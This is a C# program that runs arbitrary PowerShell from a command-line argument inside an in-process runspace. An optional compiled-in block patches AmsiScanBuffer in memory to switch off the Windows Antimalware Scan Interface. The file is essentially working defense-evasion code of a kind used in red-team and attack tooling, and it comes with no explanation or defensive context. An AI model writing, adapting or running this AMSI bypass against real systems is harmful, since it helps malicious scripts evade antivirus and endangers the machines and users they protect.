// #define AMSI

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Threading;
using System.Runtime.InteropServices;

namespace InMemory
{
    class Program
    {

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
        static void Main(string[] args)
        {
#if AMSI
            string asmiDisable = args[0];

            Console.WriteLine("Patching AMSI");
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            uint old;

            IntPtr hDll = LoadLibrary("amsi.dll");
            IntPtr asmiPtr = GetProcAddress(hDll, "AmsiScanBuffer");


            Console.WriteLine("amsi.dll at 0x{0}", hDll.ToString("X"));
            Console.WriteLine("AmsiScanBuffer at 0x{0}", asmiPtr.ToString("X"));

            VirtualProtect(asmiPtr, 3, PAGE_EXECUTE_READWRITE, out old);
            Console.WriteLine("asmiPtr old permission was 0x{0}", old.ToString("X"));

            byte[] patch = new byte[] { 0x31, 0xff, 0x90 };

            Marshal.Copy(patch, 0, asmiPtr, 3);

#endif

            StringBuilder sb = new StringBuilder();
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            RunspaceInvoke ri = new RunspaceInvoke(rs);

            Pipeline pipe = rs.CreatePipeline();

            pipe.Commands.AddScript(args[0]);
            pipe.Commands.Add("Out-String");

            Collection<PSObject> output = pipe.Invoke();
            rs.Close();
            foreach(PSObject line in output)
            {
                sb.AppendLine(line.ToString());
            }
            Console.WriteLine(sb.ToString());
        }
    }
}
